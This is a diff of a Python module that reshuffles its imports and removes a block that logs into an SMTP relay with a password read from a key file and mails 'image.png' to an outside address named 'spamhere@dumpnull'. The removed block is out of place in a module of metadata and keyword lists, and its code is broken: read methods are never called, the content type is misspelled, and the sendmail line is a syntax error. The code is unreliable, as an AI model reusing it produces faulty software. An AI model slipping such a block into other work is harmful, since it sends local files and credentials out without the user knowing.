@@ -13,18 +13,26 @@ __metadata__ = [__author__, __date__, __contact__, __version__,
                 __credits__, __copyright__, __license__]
 
 
-import smtplib
+import sys
+import ctypes
+import struct
+import shutil
+import time
 import datetime
+import hashlib
 import itertools
 import doctest
 import keyword
-import re
-import struct
-import unittest
-import uuid
-import maths
 import random
-import win32com.client as wincl
+import re
+import json
+import yaml
+import queue
+import heapq
+import unittest
+import colorama
+import win32gui
+import analytics
 
 DEBUG_MODE = True
 if DEBUG_MODE:
@@ -44,35 +52,3 @@ RESERVED = ['False', 'None', 'True', 'and', 'as', 'assert', 'break',
             'lambda', 'nonlocal', 'not', 'or', 'pass', 'print',
             'raise', 'return', 'try', 'while', 'with', 'yield']
 KEYWORDS = keyword.kwlist
-
-from email import encoders
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-
-relay = smtplib.SMTP('smtp.google.com', 25)
-relay.ehlo()
-
-with open('password.key', 'r') as secret:
-    password = secret.read
-relay.login('username@mail.com', password)
-
-message = MIMEMultipart()
-message['From'] = 'username@mail.com'
-message['To'] = 'spamhere@dumpnull'
-message['Subject'] = 'Test'
-
-with open('content.msg', 'r') as body:
-    content = body.read
-message.attach(MIMEText(content, 'plain'))
-
-filename = 'image.png'
-attachment = open(filename, 'rb')
-payload = MIMEBase('application', 'actet-stream')
-payload.set_payload(attachment.read())
-encoders.encode_base64(payload)
-payload.add_header('Content-Disposition', f'attachment; filename={filename}')
-message.attach(payload)
-
-package = message.as_string()
-relay.sendmail(message['From'], 'message['To']', package)
